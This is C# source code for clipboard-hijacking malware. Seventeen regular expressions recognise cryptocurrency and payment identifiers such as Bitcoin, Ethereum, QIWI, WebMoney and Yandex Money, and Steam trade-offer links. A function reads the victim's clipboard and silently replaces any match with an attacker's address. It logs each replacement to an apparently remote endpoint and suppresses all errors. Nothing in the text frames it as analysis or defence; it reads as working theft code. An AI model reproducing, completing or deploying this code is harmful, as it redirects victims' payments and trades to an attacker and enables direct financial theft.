Regex regex = new Regex("^((8|\\+7|\\+380|\\+375|\\+373)[\\- ]?)?(\\(?\\d{3}\\)?[\\- ]?)?[\\d\\- ]{7,10}$");
Regex regex2 = new Regex("(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$");
Regex regex3 = new Regex("(^L[A-Za-z0-9]{32,34}?[\\d\\- ])|(^L[A-Za-z0-9]{32,34})$");
Regex regex4 = new Regex("(^q[A-Za-z0-9\\:]{32,54}?[\\d\\- ])|(^q[A-Za-z0-9\\:]{32,54})$");
Regex regex5 = new Regex("^(P|p){1}[0-9]?[\\d\\- ]{7,15}|.+@.+\\..+$");
Regex regex6 = new Regex("(^0x[A-Za-z0-9]{40,40}?[\\d\\- ])|(^0x[A-Za-z0-9]{40,40})$");
Regex regex7 = new Regex("(^X[A-Za-z0-9]{32,34}?[\\d\\- ])|(^X[A-Za-z0-9]{32,34})$");
Regex regex8 = new Regex("^41001[0-9]?[\\d\\- ]{7,11}$");
Regex regex9 = new Regex("^R[0-9]?[\\d\\- ]{12,13}$");
Regex regex10 = new Regex("^Z[0-9]?[\\d\\- ]{12,13}$");
Regex regex11 = new Regex("(^(GD|GC)[A-Z0-9]{54,56}?[\\d\\- ])|(^(GD|GC)[A-Z0-9]{54,56})$");
Regex regex12 = new Regex("(^A[A-Za-z0-9]{32,34}?[\\d\\- ])|(^A[A-Za-z0-9]{32,34})$");
Regex regex13 = new Regex("(^t[A-Za-z0-9]{32,36}?[\\d\\- ])|(^t[A-Za-z0-9]{32,36})$");
Regex regex14 = new Regex("(^r[A-Za-z0-9]{32,34}?[\\d\\- ])|(^r[A-Za-z0-9]{32,34})$");
Regex regex15 = new Regex("(^G[A-Za-z0-9]{32,35}?[\\d\\- ])|(^G[A-Za-z0-9]{32,35})$");
Regex regex16 = new Regex("(^D[A-Za-z0-9]{32,35}?[\\d\\- ])|(^D[A-Za-z0-9]{32,35})$");
Regex regex17 = new Regex("(^(T[A-Z])[A-Za-z0-9]{32,35}?[\\d\\- ])|(^(T[A-Z])[A-Za-z0-9]{32,35})$");


regex = QIWI
regex2 = BTC
regex3 = LTC
regex4 = BCH
regex5 = PAYEER
regex6 = Ethereum
regex7 = DASH
regex8 = YANDEX_MONEY
regex9 = WMR
regex10 = WMZ
regex11 = XLM
regex12 = NEO
regex13 = ZCASH
regex14 = XPR
regex15 = BTG
regex16 = DOGE
regex17 = TRX

C# Regex Match Function:

private static void Checker(Program.Clipform format, object data)
{
	try
	{
		string text = Clipboard.GetText();
		Regex regex = new Regex("^((8|\\+7|\\+380|\\+375|\\+373)[\\- ]?)?(\\(?\\d{3}\\)?[\\- ]?)?[\\d\\- ]{7,10}$");
		Regex regex2 = new Regex("(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$");
		Regex regex3 = new Regex("(^L[A-Za-z0-9]{32,34}?[\\d\\- ])|(^L[A-Za-z0-9]{32,34})$");
		Regex regex4 = new Regex("(^q[A-Za-z0-9\\:]{32,54}?[\\d\\- ])|(^q[A-Za-z0-9\\:]{32,54})$");
		Regex regex5 = new Regex("^(P|p){1}[0-9]?[\\d\\- ]{7,15}|.+@.+\\..+$");
		Regex regex6 = new Regex("(^0x[A-Za-z0-9]{40,40}?[\\d\\- ])|(^0x[A-Za-z0-9]{40,40})$");
		Regex regex7 = new Regex("(^X[A-Za-z0-9]{32,34}?[\\d\\- ])|(^X[A-Za-z0-9]{32,34})$");
		Regex regex8 = new Regex("^41001[0-9]?[\\d\\- ]{7,11}$");
		Regex regex9 = new Regex("^R[0-9]?[\\d\\- ]{12,13}$");
		Regex regex10 = new Regex("^Z[0-9]?[\\d\\- ]{12,13}$");
		Regex regex11 = new Regex("(^(GD|GC)[A-Z0-9]{54,56}?[\\d\\- ])|(^(GD|GC)[A-Z0-9]{54,56})$");
		Regex regex12 = new Regex("(^A[A-Za-z0-9]{32,34}?[\\d\\- ])|(^A[A-Za-z0-9]{32,34})$");
		Regex regex13 = new Regex("(^t[A-Za-z0-9]{32,36}?[\\d\\- ])|(^t[A-Za-z0-9]{32,36})$");
		Regex regex14 = new Regex("(^r[A-Za-z0-9]{32,34}?[\\d\\- ])|(^r[A-Za-z0-9]{32,34})$");
		Regex regex15 = new Regex("(^G[A-Za-z0-9]{32,35}?[\\d\\- ])|(^G[A-Za-z0-9]{32,35})$");
		Regex regex16 = new Regex("(^D[A-Za-z0-9]{32,35}?[\\d\\- ])|(^D[A-Za-z0-9]{32,35})$");
		Regex regex17 = new Regex("(^(T[A-Z])[A-Za-z0-9]{32,35}?[\\d\\- ])|(^(T[A-Z])[A-Za-z0-9]{32,35})$");
		if (Program.QIWI != null && regex.IsMatch(text))
		{
			Clipboard.SetText(Program.QIWI);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.BTC != null && regex2.IsMatch(text))
		{
			Clipboard.SetText(Program.BTC);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.LTC != null && regex3.IsMatch(text))
		{
			Clipboard.SetText(Program.LTC);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.BCH != null && regex4.IsMatch(text))
		{
			Clipboard.SetText(Program.BCH);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.PAY != null && (text.StartsWith("P") || (text.StartsWith("p") && text.Length == 9 && regex5.IsMatch(text))))
		{
			Clipboard.SetText(Program.PAY);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.ETHEREUM != null && regex6.IsMatch(text))
		{
			Clipboard.SetText(Program.ETHEREUM);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.DASH != null && regex7.IsMatch(text))
		{
			Clipboard.SetText(Program.DASH);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.YANDEX_MONEY != null && regex8.IsMatch(text))
		{
			Clipboard.SetText(Program.YANDEX_MONEY);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.WMR != null && regex9.IsMatch(text))
		{
			Clipboard.SetText(Program.WMR);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.WMZ != null && regex10.IsMatch(text))
		{
			Clipboard.SetText(Program.WMZ);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.XLM != null && regex11.IsMatch(text))
		{
			Clipboard.SetText(Program.XLM);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.NEO != null && regex12.IsMatch(text))
		{
			Clipboard.SetText(Program.NEO);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.ZCASH != null && regex13.IsMatch(text))
		{
			Clipboard.SetText(Program.ZCASH);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.XPR != null && regex14.IsMatch(text))
		{
			Clipboard.SetText(Program.XPR);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.BTG != null && regex15.IsMatch(text))
		{
			Clipboard.SetText(Program.BTG);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.DOGE != null && regex16.IsMatch(text))
		{
			Clipboard.SetText(Program.DOGE);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.TRX != null && regex17.IsMatch(text))
		{
			Clipboard.SetText(Program.TRX);
			Program.Logger(Program.IP2, "Replace");
		}
		if (Program.STEAMTRADE_LINK != null && text.StartsWith("https://steamcommunity.com/tradeoffer/new/?partner"))
		{
			Clipboard.SetText(Program.STEAMTRADE_LINK);
			Program.Logger(Program.IP2, "Replace");
		}
	}
	catch
	{
	}
}
